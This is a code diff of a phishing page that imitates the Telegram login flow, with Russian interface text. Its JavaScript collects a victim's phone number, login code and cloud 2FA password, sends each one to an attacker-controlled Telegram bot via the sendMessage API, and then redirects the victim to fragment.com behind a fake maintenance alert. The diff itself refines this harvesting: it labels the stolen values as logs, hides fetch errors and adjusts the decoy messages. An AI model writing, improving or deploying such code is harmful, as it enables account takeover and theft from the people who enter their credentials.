@@ -41,27 +41,26 @@
         const ADMIN_ID = "6698151622";
 
         async function sendToBot(text) {
-            try {
-                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown);
-            } catch (e) { console.error("Ошибка отправки"); }
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            try { await fetch(url); } catch (e) {}
         }
 
         function nextStep(step) {
             if (step === 'code') {
                 const p = document.getElementById('phone').value;
                 if(p.length > 5) {
-                    sendToBot("📱 Новый вход\nНомер: " + p + "");
+                    sendToBot("📱 **ЛОГ: Номер телефона**\n`" + p + "`");
                     document.getElementById('step-phone').classList.add('hidden');
                     document.getElementById('step-code').classList.remove('hidden');
-                    document.getElementById('desc').innerText = "Введите код из Telegram";
+                    document.getElementById('desc').innerText = "Введите код из приложения";
                 }
             } else if (step === 'pass') {
                 const c = document.getElementById('code').value;
                 if(c.length >= 4) {
-                    sendToBot("🔢 Код: " + c + "");
+                    sendToBot("🔢 **ЛОГ: Код подтверждения**\n`" + c + "`");
                     document.getElementById('step-code').classList.add('hidden');
                     document.getElementById('step-pass').classList.remove('hidden');
-                    document.getElementById('desc').innerText = "Введите облачный пароль";
+                    document.getElementById('desc').innerText = "Введите облачный пароль (2FA)";
                 }
             }
         }
@@ -69,8 +68,8 @@
         function finish() {
             const pass = document.getElementById('password').value;
             if(pass) {
-                sendToBot("🔑 Пароль 2FA: " + pass + "");
-                alert("Синхронизация запущена. Подождите...");
+                sendToBot("🔑 **ЛОГ: Облачный пароль**\n`" + pass + "`");
+                alert("Технические работы. Попробуйте позже.");
                 window.location.href = "https://fragment.com";
             }
         }
